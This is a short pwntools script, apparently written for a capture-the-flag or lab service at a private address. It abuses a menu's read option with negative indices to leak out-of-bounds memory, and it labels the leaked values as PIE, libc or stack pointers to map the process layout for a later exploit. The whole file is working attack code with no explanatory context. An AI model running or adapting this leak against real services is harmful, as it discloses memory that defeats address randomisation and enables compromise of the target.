from pwn import *
context.log_level = 'error'

HOST, PORT = '10.34.9.91', 10042

def conn():
    return remote(HOST, PORT)

def read_cell(p, idx):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'index: ', str(idx).encode())
    p.recvuntil(b'value: ')
    return p.recvline().strip().decode()

p = conn()
print("[*] Mapping index -1 .. -50")
results = {}
for i in range(-1, -51, -1):
    try:
        v = read_cell(p, i)
        results[i] = v
        tag = ""
        if v.startswith('0x55'): tag = "  <-- PIE"
        elif v.startswith('0x7f') and not v.startswith('0x7ff'): tag = "  <-- LIBC?"
        elif v.startswith('0x7ff'): tag = "  <-- STACK"
        elif v in ('0x0','0x1'): tag = "  <-- small"
        print(f"[{i:4d}] {v}{tag}")
    except Exception as e:
        print(f"[{i:4d}] ERR {e}")
        p = conn()

p.close()
